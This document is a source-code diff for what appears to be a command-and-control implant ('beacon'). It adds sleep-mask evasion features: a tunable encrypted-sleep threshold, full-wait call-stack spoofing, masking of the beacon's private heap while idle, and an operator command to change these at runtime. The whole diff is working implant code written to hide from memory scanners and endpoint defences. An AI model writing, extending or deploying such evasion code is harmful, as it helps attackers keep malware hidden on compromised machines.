@@ -11,6 +11,15 @@
 
 typedef VOID (*FN_SM_ENTRY)( PVOID, PFUNCTION_CALL );
 
+/* P11/P5 defaults when the build did not emit the defines (dev builds):
+ * threshold 1000 ms (FOLIAGE >=1s gate) and full-wait spoof ON. */
+#ifndef NAX_SM_MIN_SLEEP_MS
+#define NAX_SM_MIN_SLEEP_MS 1000
+#endif
+#ifndef NAX_SM_WAIT_SPOOF
+#define NAX_SM_WAIT_SPOOF 1
+#endif
+
 /* ========= [ helpers ] ========= */
 
 FUNC static UINT32 NaxCountRunningJobs( PNAX_INSTANCE Nax ) {
@@ -219,6 +228,24 @@ FUNC INT NaxSleepmaskWire( PNAX_INSTANCE Nax, PBYTE coff, UINT32 coff_size ) {
     }
 #endif
 
+    /* P11 - encrypted-sleep threshold (ms): sleeps below this skip the P2
+       mask/protect cycle. Operator-tunable at build (NAX_SM_MIN_SLEEP_MS)
+       and at runtime via sleepobf-config. Only initialized when unset so a
+       sleepmask-set reload preserves a runtime-tuned value. */
+    if ( ! Nax->SmInfo.MinSleepMs )
+        Nax->SmInfo.MinSleepMs = NAX_SM_MIN_SLEEP_MS;
+    NaxDbg( Nax, "[sleepmask] min-sleep: %u ms", Nax->SmInfo.MinSleepMs );
+
+    /* P5 - full-wait stack spoof enable (no effect when SpoofReady==0,
+       i.e. the defender lane or a gateless build) */
+    Nax->SmInfo.WaitSpoof = NAX_SM_WAIT_SPOOF;
+
+    /* P6 - private-heap masking target: the beacon-owned heap. Gated inside
+       the sleepmask on the same SleepObf/ActiveJobCount conditions as the
+       code-span mask. */
+    Nax->SmInfo.HeapHandle = (PVOID)Nax->Heap;
+    NaxDbg( Nax, "[sleepmask] heap-mask: heap=%p", Nax->SmInfo.HeapHandle );
+
 #ifdef NAX_GATE_SLEEP
     if ( !Nax->GateOriginals.Sleep )
         Nax->GateOriginals.Sleep = (PVOID)Nax->Kernel32.Sleep;
@@ -315,11 +342,28 @@ FUNC INT NaxCmdSleepObfConfig( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_
 
     Nax->SmInfo.Config.SleepObf = args[0];
 
-    NaxDbg( Nax, "[sleepobf] config: sleep_obf=%u", Nax->SmInfo.Config.SleepObf );
+    /* P11 runtime override: optional LE32 MinSleepMs at args[1..4] (newer
+       plugins send 6-byte payloads; older ones send 2 and leave the
+       build-time default untouched). 0 = keep current value. */
+    UINT32 minMs = 0;
+    if ( args_len >= 5 ) {
+        minMs = NaxR32( args + 1 );
+        if ( minMs > 0 ) {
+            Nax->SmInfo.MinSleepMs = minMs;
+        } else {
+            minMs = Nax->SmInfo.MinSleepMs;
+        }
+    }
+
+    NaxDbg( Nax, "[sleepobf] config: sleep_obf=%u min_sleep=%u", Nax->SmInfo.Config.SleepObf, Nax->SmInfo.MinSleepMs );
 
     out[0] = Nax->SmInfo.Config.SleepObf;
     out[1] = 0;
     *out_len = 2;
+    if ( args_len >= 5 ) {
+        NaxW32( out + 2, Nax->SmInfo.MinSleepMs );
+        *out_len = 6;
+    }
 
     return NAX_OK;
 }
